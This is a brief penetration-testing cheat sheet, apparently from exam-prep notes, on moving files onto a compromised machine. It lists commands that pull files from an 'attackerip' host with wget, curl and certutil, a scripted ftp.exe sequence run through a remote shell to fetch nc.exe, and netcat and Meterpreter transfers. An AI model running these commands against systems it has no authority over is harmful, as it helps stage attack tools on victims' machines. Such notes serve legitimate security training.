# File transfers

## File transfers

### HTTP

Two options:

1. Use SimpleHTTPServer to serve files from the current directory:

`Python -m SimpleHTTPServer 80`

1. Use Apache to create a webserver on the attacking machine \(var/www/html\)

`systemctl start Apache2`

Pull files on target machine:

`wget http://attackerip/file`

`curl http://attackerip/file > file`

Windows: `certutil -urlcache -f http://sourceip/file.exe [c:\desired_destination\desired_]name.exe`

### FTP

Create an FTP server in the directory you are in, on port 21, allow anonymous access:

`Python -m pyftpdlib 21`

Connect with:

`ftp $IPaddressofattacker`

Can be made non-interactive by providing the ftp.exe with a text file containing the commands to be executed

Use the following via remote shell to download

`Echo open 10.11.0.5 21 >> ftp.txt`

`Echo USER offsec>> ftp.txt`

`Echo ftp>> ftp.txt`

`Echo bin>> ftp.txt`

`Echo GET nc.exe >> ftp.txt`

`Echo bye >> ftp.txt`

`ftp -v -n -s:ftp.txt`

### Netcat

On receiving machine: `nc -nlvp 4444 > incoming.exe`

On sending machine: `nc – nv 10.11.23.33 4444 < file.exe`

### Meterpreter

Upload/download feature
